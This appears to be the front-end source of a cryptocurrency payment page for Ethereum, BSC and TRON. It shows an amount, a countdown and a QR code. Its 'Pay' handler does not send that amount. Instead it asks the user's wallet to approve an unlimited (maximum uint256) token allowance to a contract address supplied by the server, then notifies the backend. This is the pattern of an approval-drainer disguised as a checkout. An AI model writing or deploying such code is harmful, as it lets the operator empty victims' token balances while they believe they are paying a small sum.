"use client";

import React, { useState, useEffect } from "react";
import { useParams, useSearchParams } from "next/navigation";
import { useTranslation } from "react-i18next";
import i18n from "@/lib/i18n";
import { ChainType } from "@/types";
import { usePayment } from "@/hooks/usePayment";
import { CHAIN_ID_HEX, CHAIN_NAMES, EXPLORER_URLS, NATIVE_CURRENCIES, RPC_URLS } from "@/constants";
import { QRCode } from "@/components/ui/QRCode";
import { ErrorBoundary } from "@/components/ui/ErrorBoundary";

export default function PaymentPage() {
  return (
    <ErrorBoundary>
      <PaymentPageContent />
    </ErrorBoundary>
  );
}

function PaymentPageContent() {
  const params = useParams();
  const searchParams = useSearchParams();
  const paymentId = params.id as string;
  const { t } = useTranslation();
  const { payment, isLoading, error, refetch } = usePayment(paymentId);

  const supportedLanguages = ["en", "zh", "de", "es", "it", "fr", "tr", "sk", "cs"];
  const initialLang = (() => {
    const langParam = searchParams.get("lang");
    if (langParam && supportedLanguages.includes(langParam)) return langParam;
    return "en";
  })();
  const [preferredLanguage, setPreferredLanguage] = useState<string>(initialLang);

  const [statusCheckInterval, setStatusCheckInterval] = useState<NodeJS.Timeout | null>(null);
  const [localPaymentStatus, setLocalPaymentStatus] = useState<string | null>(null);
  const [selectedChain, setSelectedChain] = useState<ChainType>("ethereum");
  const [timeLeft, setTimeLeft] = useState<{ minutes: number; seconds: number }>({ minutes: 0, seconds: 0 });
  
  // Mobile wallet detection and connection state
  const [isMobileWallet, setIsMobileWallet] = useState(false);
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [isCheckingBalance, setIsCheckingBalance] = useState(false);
  const [balanceCheck, setBalanceCheck] = useState<{
    hasEnoughNative: boolean;
    hasEnoughToken: boolean;
    nativeBalance: string;
    tokenBalance: string;
    error?: string;
  } | null>(null);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);

  // Parse expiration date properly
  const isExpired = payment && (() => {
    if (!payment.expires_at) return false;
    let expiresAt: Date;
    if (typeof payment.expires_at === "string") {
      if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(payment.expires_at)) {
        expiresAt = new Date(payment.expires_at + "Z");
      } else {
        expiresAt = new Date(payment.expires_at);
      }
    } else {
      expiresAt = new Date(payment.expires_at);
    }
    const now = new Date();
    if (isNaN(expiresAt.getTime())) return false;
    return expiresAt < now;
  })();

  // Format payment amount (remove trailing zeros)
  const formatPaymentAmount = (amount: number | string): string => {
    const numAmount = typeof amount === "string" ? parseFloat(amount) : amount;
    if (isNaN(numAmount)) return "0.00";
    const formatted = numAmount.toFixed(2);
    return formatted.replace(/\.?0+$/, "") || "0";
  };

  // Helper function to get blockchain explorer URL
  const getExplorerUrl = (chain: ChainType, txHash: string): string => {
    switch (chain) {
      case "ethereum":
        return `https://etherscan.io/tx/${txHash}`;
      case "bsc":
        return `https://bscscan.com/tx/${txHash}`;
      case "tron":
        return `https://tronscan.org/#/transaction/${txHash}`;
      default:
        return "";
    }
  };

  // Generate QR code value - Payment URL that opens wallet and triggers contract
  const generateQRCodeValue = (chain: ChainType): string => {
    if (typeof window === "undefined") return "";
    const baseUrl = window.location.origin;
    // Generate payment URL that will trigger wallet interaction when scanned
    // This URL opens the payment page which handles wallet connection and contract calls
    return `${baseUrl}/pay/${paymentId}?chain=${chain}`;
  };

  // Detect mobile wallet
  useEffect(() => {
    if (typeof window === "undefined") return;
    
    // Check for EVM wallets (MetaMask, etc.)
    const hasEVMWallet = !!(window.ethereum);
    
    // Check for TRON wallets (TronLink, etc.)
    const hasTronWallet = !!(window.tronWeb || window.tronLink);
    
    if (hasEVMWallet || hasTronWallet) {
      setIsMobileWallet(true);
      
      // Try to get connected address
      const checkConnection = async () => {
        try {
          if (hasEVMWallet && window.ethereum) {
            const accounts = await window.ethereum.request({ method: "eth_accounts" });
            if (accounts && accounts.length > 0) {
              setWalletAddress(accounts[0]);
              setWalletConnected(true);
            }
          } else if (hasTronWallet) {
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
              setWalletAddress(window.tronWeb.defaultAddress.base58);
              setWalletConnected(true);
            } else if (window.tronLink && window.tronLink.ready) {
              const address = window.tronLink.tronWeb.defaultAddress?.base58;
              if (address) {
                setWalletAddress(address);
                setWalletConnected(true);
              }
            }
          }
        } catch (error) {
          console.error("Error checking wallet connection:", error);
        }
      };
      
      checkConnection();
    }
  }, []);

  // Check balances when wallet is connected and chain is selected
  useEffect(() => {
    if (!isMobileWallet || !walletConnected || !walletAddress || !payment) return;
    
    const checkBalances = async () => {
      setIsCheckingBalance(true);
      try {
        const response = await fetch("/api/payment/check-balances", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            address: walletAddress,
            chain: selectedChain,
            currency: payment.currency,
            amount: payment.amount,
          }),
        });
        
        if (response.ok) {
          const data = await response.json();
          setBalanceCheck(data);
        } else {
          setBalanceCheck({
            hasEnoughNative: false,
            hasEnoughToken: false,
            nativeBalance: "0",
            tokenBalance: "0",
            error: "Failed to check balances",
          });
        }
      } catch (error) {
        console.error("Error checking balances:", error);
        setBalanceCheck({
          hasEnoughNative: false,
          hasEnoughToken: false,
          nativeBalance: "0",
          tokenBalance: "0",
          error: "Error checking balances",
        });
      } finally {
        setIsCheckingBalance(false);
      }
    };
    
    checkBalances();
  }, [isMobileWallet, walletConnected, walletAddress, selectedChain, payment]);

  // Connect wallet
  const connectWallet = async () => {
    try {
      if (selectedChain === "tron") {
        // TRON wallet connection
        if (window.tronLink) {
          await window.tronLink.request({ method: "tron_requestAccounts" });
          if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
            const address = window.tronLink.tronWeb.defaultAddress.base58;
            setWalletAddress(address);
            setWalletConnected(true);
          }
        } else if (window.tronWeb && window.tronWeb.defaultAddress) {
          const address = window.tronWeb.defaultAddress.base58;
          setWalletAddress(address);
          setWalletConnected(true);
        }
      } else {
        // EVM wallet connection
        if (window.ethereum) {
          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
          if (accounts && accounts.length > 0) {
            setWalletAddress(accounts[0]);
            setWalletConnected(true);
          }
        }
      }
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  };

  // Switch EVM wallet to the selected chain before approve
  const ensureEVMChain = async (chain: ChainType): Promise<void> => {
    if (chain === "tron" || !window.ethereum) return;
    const chainIdHex = CHAIN_ID_HEX[chain];
    try {
      const currentChainId = await window.ethereum.request({ method: "eth_chainId" });
      if (currentChainId === chainIdHex) return;
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: chainIdHex }],
        });
      } catch (switchErr: any) {
        if (switchErr?.code === 4902 || switchErr?.code === -32603) {
          const native = NATIVE_CURRENCIES[chain];
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: chainIdHex,
                chainName: CHAIN_NAMES[chain],
                rpcUrls: [RPC_URLS[chain]],
                blockExplorerUrls: [EXPLORER_URLS[chain]],
                nativeCurrency: {
                  name: native.name,
                  symbol: native.symbol,
                  decimals: native.decimals,
                },
              },
            ],
          });
        } else {
          throw switchErr;
        }
      }
    } catch (err: any) {
      throw new Error(err?.message || "Failed to switch network");
    }
  };

  // Process payment (approve token directly from wallet)
  const handlePay = async () => {
    if (!walletAddress || !payment || isProcessingPayment) return;

    setIsProcessingPayment(true);
    try {
      // Get contract address for the selected chain
      const response = await fetch("/api/payment/get-contract-address", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chain: selectedChain, currency: payment.currency }),
      });

      if (!response.ok) {
        throw new Error("Failed to get contract address");
      }

      const { contractAddress, tokenAddress } = await response.json();

      // Call approve function directly from wallet
      if (selectedChain === "tron") {
        // TRON approval
        if (!window.tronWeb && !window.tronLink) {
          throw new Error("TRON wallet not found");
        }
        
        const tronWeb = window.tronWeb || (window.tronLink?.tronWeb);
        if (!tronWeb) {
          throw new Error("TRON wallet not connected");
        }
        
        // Call approve function using TronWeb contract
        const contract = await tronWeb.contract().at(tokenAddress);
        const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
        const tx = await contract.approve(contractAddress, MAX_APPROVAL).send();
        
        if (tx) {
          // Notify backend about the approval
          await fetch("/api/payment/process", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              paymentId: paymentId,
              currency: payment.currency,
              amount: payment.amount.toString(),
              userAddress: walletAddress,
              chain: selectedChain,
              txHash: tx,
            }),
          });
          
          setLocalPaymentStatus("processing");
          refetch();
        }
      } else {
        // EVM approval (Ethereum, BSC) – switch to selected chain first
        if (!window.ethereum) {
          throw new Error("EVM wallet not found");
        }
        await ensureEVMChain(selectedChain);

        const { ethers } = await import("ethers");
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        
        // Get token contract
        const tokenContract = new ethers.Contract(
          tokenAddress,
          ["function approve(address spender, uint256 amount) returns (bool)"],
          signer
        );
        
        // MAX_APPROVAL
        const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
        
        // Send approval transaction
        const tx = await tokenContract.approve(contractAddress, MAX_APPROVAL);
        const receipt = await tx.wait();
        
        if (receipt.hash) {
          // Notify backend about the approval
          await fetch("/api/payment/process", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              paymentId: paymentId,
              currency: payment.currency,
              amount: payment.amount.toString(),
              userAddress: walletAddress,
              chain: selectedChain,
              txHash: receipt.hash,
            }),
          });
          
          setLocalPaymentStatus("processing");
          refetch();
        }
      }
    } catch (error: any) {
      console.error("Error processing payment:", error);
      alert(error.message || "Payment failed");
    } finally {
      setIsProcessingPayment(false);
    }
  };

  useEffect(() => {
    try {
      const targetLanguage = preferredLanguage || "en";
      if (i18n.language !== targetLanguage) {
        i18n.changeLanguage(targetLanguage);
      }
    } catch (error) {
      // Silent error handling
    }
  }, [preferredLanguage, i18n.language]);

  const checkPaymentStatus = async () => {
    try {
      if (
        payment &&
        (payment.status === "pending" || payment.status === "processing")
      ) {
        const response = await fetch(
          `/api/payment/status?payment_id=${paymentId}`
        );
        if (response.ok) {
          const data = await response.json();
          if (data.status && data.status !== payment.status) {
            setLocalPaymentStatus(data.status);
            if (data.status === "completed") {
              stopStatusPolling();
            }
          }
        }
      }
    } catch (error) {
      console.error("Failed to check payment status:", error);
    }
  };

  const startStatusPolling = () => {
    if (statusCheckInterval) {
      clearInterval(statusCheckInterval);
    }
    const interval = setInterval(() => {
      if (
        payment &&
        (payment.status === "pending" || payment.status === "processing")
      ) {
        checkPaymentStatus();
      } else {
        stopStatusPolling();
      }
    }, 3000);
    setStatusCheckInterval(interval);
  };

  const stopStatusPolling = () => {
    if (statusCheckInterval) {
      clearInterval(statusCheckInterval);
      setStatusCheckInterval(null);
    }
  };

  useEffect(() => {
    if (payment && payment.status !== "completed") {
      setLocalPaymentStatus(null);
      if (payment.status === "pending" || payment.status === "processing") {
        startStatusPolling();
      } else {
        stopStatusPolling();
      }
    } else if (payment && payment.status === "completed") {
      setLocalPaymentStatus("completed");
      stopStatusPolling();
    }
  }, [payment?.status]);

  useEffect(() => {
    return () => {
      stopStatusPolling();
    };
  }, []);

  const handlePaymentComplete = (txHash?: string) => {
    stopStatusPolling();
    refetch();
  };

  const handleExpire = () => {
    if (payment) {
      payment.status = "expired";
    }
    refetch();
  };

  const currentStatus = localPaymentStatus || payment?.status;

  // Calculate time left for circular timer
  useEffect(() => {
    if (!payment || !payment.expires_at || currentStatus !== "pending") {
      return;
    }

    const calculateTimeLeft = () => {
      const now = new Date().getTime();
      let expiryDate: Date;
      if (typeof payment.expires_at === "string") {
        if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(payment.expires_at)) {
          expiryDate = new Date(payment.expires_at + "Z");
        } else {
          expiryDate = new Date(payment.expires_at);
        }
      } else {
        expiryDate = new Date(payment.expires_at);
      }
      
      const expiry = expiryDate.getTime();
      const difference = expiry - now;

      if (difference > 0) {
        const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((difference % (1000 * 60)) / 1000);
        setTimeLeft({ minutes, seconds });
      } else {
        setTimeLeft({ minutes: 0, seconds: 0 });
        handleExpire();
      }
    };

    calculateTimeLeft();
    const timer = setInterval(calculateTimeLeft, 1000);

    return () => clearInterval(timer);
  }, [payment?.expires_at, currentStatus]);

  // Loading state
  if (isLoading) {
    return (
      <div className="h-screen w-screen bg-white flex items-center justify-center p-4">
        <div className="w-full max-w-sm">
          <div className="bg-white rounded-2xl shadow-lg p-6 space-y-6">
            {/* Title placeholder */}
            <div className="h-4 w-28 bg-gray-200 rounded mx-auto animate-pulse"></div>

            {/* Header placeholders */}
            <div className="flex items-center justify-between">
              <div className="w-9 h-9 bg-gray-100 rounded-lg animate-pulse blur-[0.2px]"></div>
              <div className="text-center blur-[0.2px] opacity-70">
                <div className="h-6 w-20 bg-gray-200 rounded mx-auto animate-pulse"></div>
                <div className="h-3 w-12 bg-gray-100 rounded mx-auto mt-2 animate-pulse"></div>
              </div>
              <div className="w-12 h-12 rounded-full border-2 border-gray-200 animate-pulse blur-[0.2px]"></div>
            </div>

            {/* QR placeholder */}
            <div className="w-full aspect-square rounded-xl bg-gray-100 animate-pulse"></div>

            {/* Buttons / info placeholders with slight blur */}
            <div className="space-y-3 blur-[0.3px] opacity-70">
              <div className="h-10 bg-gray-100 rounded-lg animate-pulse"></div>
              <div className="h-10 bg-gray-100 rounded-lg animate-pulse"></div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Success state
  if (currentStatus === "completed") {
    return (
      <div className="h-screen w-screen bg-white flex items-center justify-center p-4">
        <div className="w-full max-w-sm">
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h1 className="text-xl font-bold text-gray-900 mb-2">{t("paymentPage.successTitle")}</h1>
              <p className="text-gray-600 mb-4 text-sm">{t("paymentPage.successDesc")}</p>
              
              <div className="bg-gray-50 rounded-xl p-4 mb-4">
                <div className="flex items-center justify-center gap-2 mb-2">
                  <span className="text-2xl font-bold text-green-600 font-mono">
                    {formatPaymentAmount(payment?.amount || 0)}
                  </span>
                  <span className="text-sm text-gray-600">{payment?.currency.toUpperCase()}</span>
                </div>
                {payment?.tx_hash && payment?.chain && (
                  <a
                    href={getExplorerUrl(payment?.chain, payment?.tx_hash)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs text-blue-500 hover:text-blue-600 mt-2 inline-block"
                  >
                    {t("paymentPage.viewTx")}
                  </a>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Processing state
  if (currentStatus === "processing") {
    return (
      <div className="h-screen w-screen bg-white flex items-center justify-center p-4">
        <div className="w-full max-w-sm">
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="text-center">
              <div className="relative mb-4">
                <div className="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto"></div>
              </div>
              <h1 className="text-xl font-bold text-gray-900 mb-2">{t("paymentPage.processingTitle")}</h1>
              <p className="text-gray-600 text-sm">{t("paymentPage.processingDesc")}</p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Error state
  if (error || !payment) {
    return (
      <div className="h-screen w-screen bg-white flex items-center justify-center p-4">
        <div className="w-full max-w-sm">
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="text-center">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </div>
              <h1 className="text-xl font-bold text-gray-900 mb-2">{t("paymentPage.invalidTitle")}</h1>
              <p className="text-gray-600 mb-4 text-sm">
                {t("paymentPage.invalidDesc")}
              </p>
              <button
                onClick={() => window.location.reload()}
                className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors text-sm"
              >
                {t("paymentPage.reload")}
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Main payment page - Simple white card design
  return (
    <div className="h-screen w-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        {/* White Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6">
          {/* Title */}
          <div className="text-center mb-4">
            <h2 className="text-base font-semibold text-gray-900"></h2>
          </div>

          {/* Header - Amount with icons */}
          <div className="flex items-center justify-between mb-6">
            <button
              onClick={() => {
                const qrValue = generateQRCodeValue(selectedChain);
                if (qrValue) {
                  navigator.clipboard.writeText(qrValue);
                }
              }}
              className="p-2 hover:bg-gray-100 rounded-lg transition-colors"
              title={t("paymentPage.copyAddress")}
            >
              <svg className="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            </button>
            
            <div className="text-center">
              <div className="text-3xl font-bold text-black">
                {formatPaymentAmount(payment.amount)}
              </div>
              <div className="text-sm text-gray-500 mt-1">{payment.currency.toUpperCase()}</div>
            </div>

            {/* Circular Time Left */}
            {currentStatus === "pending" && !isExpired ? (
              <div className="w-12 h-12 rounded-full border-2 border-blue-500 flex flex-col items-center justify-center">
                <div className="text-xs font-bold text-blue-500">
                  {String(timeLeft.minutes).padStart(2, "0")}:{String(timeLeft.seconds).padStart(2, "0")}
                </div>
              </div>
            ) : (
              <div className="w-12 h-12"></div>
            )}
          </div>

          {/* Expired Message */}
          {isExpired && (
            <div className="bg-red-50 rounded-lg p-3 mb-4 text-center">
              <div className="text-red-600 text-sm font-semibold">{t("paymentPage.expired")}</div>
            </div>
          )}

          {/* Chain Selection and Payment UI - Only if pending and not expired */}
          {currentStatus === "pending" && !isExpired && (
            <div className="space-y-4">
              {/* Chain Selection */}
              <div>
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { id: "ethereum", name: "ETH", icon: "/icons/ethereum.png" },
                    { id: "bsc", name: "BSC", icon: "/icons/bsc.png" },
                    { id: "tron", name: "TRON", icon: "/icons/tron.png" },
                  ].map((chain) => (
                    <button
                      key={chain.id}
                      onClick={() => setSelectedChain(chain.id as ChainType)}
                      className={`p-3 rounded-lg text-xs font-semibold transition-all flex flex-col items-center gap-2 ${
                        selectedChain === chain.id
                          ? "bg-blue-500 text-white"
                          : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                      }`}
                    >
                      <img src={chain.icon} alt={chain.name} className="w-5 h-5" onError={(e) => { e.currentTarget.style.display = "none"; }} />
                      <span>{chain.name}</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Mobile Wallet: Show Pay Button */}
              {isMobileWallet ? (
                <div className="space-y-4">
                  {/* Wallet Connection Status */}
                  {!walletConnected ? (
                    <button
                      onClick={connectWallet}
                      className="w-full py-3 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-semibold transition-colors"
                    >
                      {t("paymentPage.connectAndPay")}
                    </button>
                  ) : (
                    <div className="space-y-3">
                      {/* Wallet Address */}
                      <div className="bg-gray-50 rounded-lg p-3 text-center">
                        <div className="text-xs text-gray-500 mb-1">{t("paymentPage.walletAddress")}</div>
                        <div className="text-xs font-mono text-gray-900 truncate">
                          {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
                        </div>
                      </div>

                      {/* Balance Check */}
                      {isCheckingBalance ? (
                        <div className="text-center py-2">
                          <div className="w-5 h-5 border-2 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto"></div>
                          <p className="text-xs text-gray-500 mt-2">{t("paymentPage.checkingBalance")}</p>
                        </div>
                      ) : balanceCheck ? (
                        <>
                          {/* Balance Warnings */}
                          {(!balanceCheck.hasEnoughNative || !balanceCheck.hasEnoughToken) && (
                            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                              <div className="text-xs font-semibold text-yellow-800 mb-1">{t("paymentPage.balanceLow")}</div>
                              {!balanceCheck.hasEnoughNative && (
                                <div className="text-xs text-yellow-700">
                                  {t("paymentPage.feeInsufficient", {
                                    symbol:
                                      selectedChain === "ethereum"
                                        ? "ETH"
                                        : selectedChain === "bsc"
                                        ? "BNB"
                                        : "TRX",
                                  })}
                                </div>
                              )}
                              {!balanceCheck.hasEnoughToken && (
                                <div className="text-xs text-yellow-700">
                                  {t("paymentPage.tokenInsufficient", {
                                    amount: formatPaymentAmount(payment.amount),
                                    symbol: payment.currency.toUpperCase(),
                                  })}
                                </div>
                              )}
                            </div>
                          )}

                          {/* Pay Button */}
                          <button
                            onClick={handlePay}
                            disabled={
                              !balanceCheck.hasEnoughNative ||
                              !balanceCheck.hasEnoughToken ||
                              isProcessingPayment
                            }
                            className={`w-full py-3 rounded-lg font-semibold transition-colors ${
                              balanceCheck.hasEnoughNative &&
                              balanceCheck.hasEnoughToken &&
                              !isProcessingPayment
                                ? "bg-blue-500 hover:bg-blue-600 text-white"
                                : "bg-gray-300 text-gray-500 cursor-not-allowed"
                            }`}
                          >
                            {isProcessingPayment ? t("paymentPage.processingButton") : t("paymentPage.pay")}
                          </button>
                        </>
                      ) : null}
                    </div>
                  )}
                </div>
              ) : (
                /* Desktop/Regular: Show QR Code */
                <div className="w-full">
                  <QRCode 
                    value={generateQRCodeValue(selectedChain)} 
                    size={300}
                    chain={selectedChain}
                  />
                </div>
              )}
            </div>
          )}

          {/* Status Display - For non-pending states */}
          {(currentStatus === "processing" || currentStatus === "failed" || currentStatus === "expired") && (
            <div className="text-center py-6">
              <div className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3 ${
                currentStatus === "processing" 
                  ? "bg-blue-500" 
                  : currentStatus === "failed" 
                  ? "bg-red-500" 
                  : "bg-gray-500"
              }`}>
                {currentStatus === "processing" ? (
                  <div className="w-6 h-6 border-3 border-white border-t-transparent rounded-full animate-spin"></div>
                ) : currentStatus === "failed" ? (
                  <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                ) : (
                  <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                )}
              </div>
              <h3 className="text-sm font-bold text-gray-900 mb-1">
                {currentStatus === "processing"
                  ? t("paymentPage.processingTitle")
                  : currentStatus === "failed"
                  ? t("paymentPage.failedTitle")
                  : t("paymentPage.expired")}
              </h3>
              {payment.tx_hash && payment.chain && currentStatus === "processing" && (
                <a
                  href={getExplorerUrl(payment.chain, payment.tx_hash)}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-xs text-blue-500 hover:text-blue-600 mt-2 inline-block"
                >
                  {t("paymentPage.viewTx")}
                </a>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
